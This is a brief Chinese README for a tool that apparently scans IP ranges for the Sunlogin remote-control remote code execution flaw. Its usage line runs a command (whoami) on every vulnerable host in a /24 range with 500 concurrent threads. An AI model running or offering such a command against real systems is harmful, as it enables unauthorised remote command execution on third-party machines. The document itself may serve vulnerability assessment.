# Sunlogin_RCE_Detec.exe 
## 简介
一款并发探测向日葵远程代码执行漏洞的工具，支持单IP、IP段格式扫描
## 使用方法
Sunlogin_RCE_Detect.exe -i 192.168.0.1/24 -c whoami -t 500

-i     目标IP
-c     执行命令
-t     并发数量
